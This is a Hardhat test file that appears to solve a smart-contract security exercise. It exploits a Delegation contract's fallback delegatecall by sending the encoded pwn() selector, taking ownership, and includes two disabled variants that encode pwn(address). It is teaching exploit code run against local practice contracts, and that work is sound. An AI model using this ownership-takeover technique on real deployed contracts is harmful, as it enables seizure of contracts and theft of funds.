process.env.NODE_ENV = "test";

const { expect } = require("chai");
const { ethers } = require("hardhat");
const { log } = require("./Utils");

describe("📗 Delegation", function () {
  let owner;
  let hacker;
  let hacker2;

  it("🤓 Should hack fallback function for claiming contract ownership", async function () {
    // 🔨 Addresses
    [owner, hacker, hacker2] = await ethers.getSigners();

    // 📗 Contract
    const Delegate = await ethers.getContractFactory("Delegate", owner);
    const delegate = await Delegate.connect(owner).deploy(owner.address);
    await delegate.deployed();

    const Delegation = await ethers.getContractFactory("Delegation", owner);
    const delegation = await Delegation.connect(owner).deploy(delegate.address);
    await delegation.deployed();

    // 🗣 Logging status
    let delegationOwner = await delegation.owner();
    log("🔑 Initial delegation owner:", delegationOwner);

    // 👿 Hacking the contract calling pwn() function
    // 📖 https://docs.soliditylang.org/en/v0.8.12/abi-spec.html#function-selector
    // 📖 https://es.wikipedia.org/wiki/Sistema_hexadecimal
    // 📖 https://docs.ethers.io/v4/api-utils.html#utf-8-strings
    if (true) {
      delegationOwner = await hackingWithoutParameters(
        hacker,
        delegation,
        delegationOwner
      );
    }

    // 👿 Hacking the contract calling pwn(address) function
    // 📖 https://docs.soliditylang.org/en/v0.8.12/abi-spec.html#function-selector
    // 📖 https://es.wikipedia.org/wiki/Sistema_hexadecimal
    // 📖 https://docs.ethers.io/v4/api-utils.html#utf-8-strings
    if (false) {
      delegationOwner = await hackingWithParametersOption1(
        hacker2,
        hacker,
        delegation,
        delegationOwner
      );
    }

    // 👿 Hacking the contract calling pwn(address) function
    // 📖 https://docs.soliditylang.org/en/v0.8.12/abi-spec.html#function-selector
    // 📖 https://es.wikipedia.org/wiki/Sistema_hexadecimal
    // 📖 https://docs.ethers.io/v4/api-utils.html#utf-8-strings
    if (false) {
      delegationOwner = await hackingWithParametersOption2(
        owner,
        hacker,
        delegation,
        delegationOwner
      );
    }
  });
});

/**
 *
 * @param {*} newOwner
 * @param {*} delegation
 * @param {*} delegationOwner
 * @returns
 */
async function hackingWithoutParameters(newOwner, delegation, delegationOwner) {
  // 📖 https://ethereum.stackexchange.com/questions/114146/how-do-i-manually-encode-and-send-transaction-data
  const pwnFunctionSelector = ethers.utils
    .keccak256(ethers.utils.toUtf8Bytes("pwn()"))
    .substring(0, 10);

  log("\n👿 Hacking . . .");
  log("👿 pwn() function selector:", pwnFunctionSelector);

  // 📖 https://docs.ethers.io/v4/api-utils.html#solidity
  const fallbackDelegateCallHackedTx = await newOwner.sendTransaction({
    to: delegation.address,
    data: ethers.utils.solidityPack(["bytes4"], [pwnFunctionSelector]),
  });
  await fallbackDelegateCallHackedTx.wait((confirms = 1)); // wait until the transaction is mined

  // 🗣 Logging status
  delegationOwner = await delegation.owner();
  log("🔑 Delegation owner:", delegationOwner);

  // ✅ Check if the hack was successful
  expect(delegationOwner).to.eq(newOwner.address);
  return delegationOwner;
}

/**
 *
 * @param {*} newOwner
 * @param {*} hacker
 * @param {*} delegation
 * @param {*} delegationOwner
 * @returns
 */
async function hackingWithParametersOption1(
  newOwner,
  hacker,
  delegation,
  delegationOwner
) {
  // 👿 Encoding the data for the delegatecall
  // 📖 https://github.com/ethers-io/ethers.js/issues/47
  // 📖 https://ethereum.stackexchange.com/questions/114146/how-do-i-manually-encode-and-send-transaction-data
  let ABI = ["function pwn(address _owner)"];
  let iface = new ethers.utils.Interface(ABI);
  let dataEncoded = iface.encodeFunctionData("pwn", [newOwner.address]);

  log("\n👿 Hacking . . .");
  log("👿 pwn(address) encoded data:", dataEncoded);

  // 📖 https://docs.ethers.io/v4/api-utils.html#solidity
  const fallbackDelegateWithInputCallHackedTx = await hacker.sendTransaction({
    to: delegation.address,
    data: dataEncoded,
  });
  await fallbackDelegateWithInputCallHackedTx.wait((confirms = 1)); // wait until the transaction is mined

  // 🗣 Logging status
  delegationOwner = await delegation.owner();
  log("🔑 Delegation owner:", delegationOwner);

  // ✅ Check if the hack was successful
  expect(delegationOwner).to.eq(newOwner.address);
  return delegationOwner;
}

/**
 *
 * @param {*} newOwner
 * @param {*} hacker
 * @param {*} delegation
 * @param {*} delegationOwner
 * @returns
 */
async function hackingWithParametersOption2(
  newOwner,
  hacker,
  delegation,
  delegationOwner
) {
  // 👿 Encoding the data for the delegatecall
  // 📖 https://github.com/ethers-io/ethers.js/issues/47
  // 📖 https://ethereum.stackexchange.com/questions/114146/how-do-i-manually-encode-and-send-transaction-data
  // 📖 https://docs.soliditylang.org/en/v0.8.15/abi-spec.html?#examples
  // 📖 https://medium.com/coinmonks/delegatecall-calling-another-contract-function-in-solidity-b579f804178c
  // 👉 In EVM it has 2^256 slot in Smart Contract storage and each slot can save 32-byte size data.
  // 👉 Function Selector: This is first 4 bytes of function call’s bytecode.
  // This is generated by hashing target function’s name plus with the type
  // of its arguments excluding empty space. For example savaValue(uint).
  // Currently, Ethereum uses keccak-256 hashing function to create function selector.
  // Based on this function selector, EVM can decide which function should be called
  // in the contract.
  const pwnFunctionSelector = ethers.utils
    .keccak256(ethers.utils.toUtf8Bytes("pwn(address)"))
    .substring(0, 10);

  // 👉 Convert each value of arguments into a hex string with the fixed length of 32 bytes.
  // If there is more than one argument, concatenate
  const pwnFunctionParameters = ethers.utils.defaultAbiCoder.encode(
    ["address"],
    [newOwner.address]
  );

  // 👉 If the user passes this 4 + 32 * N bytes bytecode to the data field of the transaction.
  // EVM can find which function should be executed then inject arguments to that function.
  let dataEncoded = ethers.utils.hexConcat([
    pwnFunctionSelector,
    pwnFunctionParameters,
  ]);

  log("\n👿 Hacking . . .");
  log("👿 pwn(address) encoded data:", dataEncoded);

  // 📖 https://docs.ethers.io/v4/api-utils.html#solidity
  const fallbackDelegateWithInputCallHackedTx = await hacker.sendTransaction({
    to: delegation.address,
    data: dataEncoded,
  });
  await fallbackDelegateWithInputCallHackedTx.wait((confirms = 1)); // wait until the transaction is mined

  // 🗣 Logging status
  delegationOwner = await delegation.owner();
  log("🔑 Delegation owner:", delegationOwner);

  // ✅ Check if the hack was successful
  expect(delegationOwner).to.eq(newOwner.address);
  return delegationOwner;
}
